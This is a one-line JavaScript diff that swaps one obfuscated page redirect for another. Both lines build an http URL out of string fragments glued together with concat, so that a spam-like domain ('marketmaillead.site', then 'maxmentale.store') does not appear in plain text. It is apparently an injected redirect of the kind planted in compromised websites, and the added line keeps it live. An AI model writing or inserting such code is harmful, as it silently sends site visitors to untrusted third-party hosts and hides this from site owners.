@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`ht`,`tp:`,`//ma`,`rke`,`tma`,`illea`,`d.si`,`te/cl`,`/0_m`,`t/1/2`,`35/86`,`6/0/`,`0`))
+window.location.replace(``.concat(`ht`,`tp:/`,`/max`,`ment`,`ale.s`,`tor`,`e/c`,`l/0_m`,`t/1/282`,`/864/0`,`/0`))
